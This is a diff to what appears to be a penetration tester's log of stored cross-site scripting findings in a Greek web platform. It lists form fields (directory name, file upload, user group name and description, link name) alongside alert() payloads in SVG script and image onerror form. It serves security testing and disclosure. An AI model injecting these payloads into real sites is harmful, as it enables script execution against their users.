@@ -94,6 +94,24 @@ TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
 		<svg xmlns="#"><script>alert(1)</script></svg>
 	---> Λεπτομέρειες
 		<svg xmlns="#"><script>alert(1)</script></svg>
+		
+Έγγραφα:
+--->Δημιουργία καταλόγου
+	---> Ονομα νέου καταλόγου
+		<svg xmlns="#"><script>alert(1)</script></svg>
+	---> Ανέβασμα αρχείου στον εξυπηρέτη
+		<svg xmlns="#"><script>alert(1)</script></svg>
+		
+Ομάδες Χρηστών:
+	---> Όνομα ομάδας χρηστών
+		<svg xmlns="#"><script>alert(1)</script></svg>
+	---> Περιγραφή
+		<svg xmlns="#"><script>alert(1)</script></svg>
+
+Σύνδεσμος:
+	---> Αλλαγή Συνδέσμου
+		---> Όνομα Συνδέσμου
+			<image src=1 href=1 onerror="javascript:alert(2)"></image>
 --------------------------------------------------------------------------------------------------------
 
 THANOS:
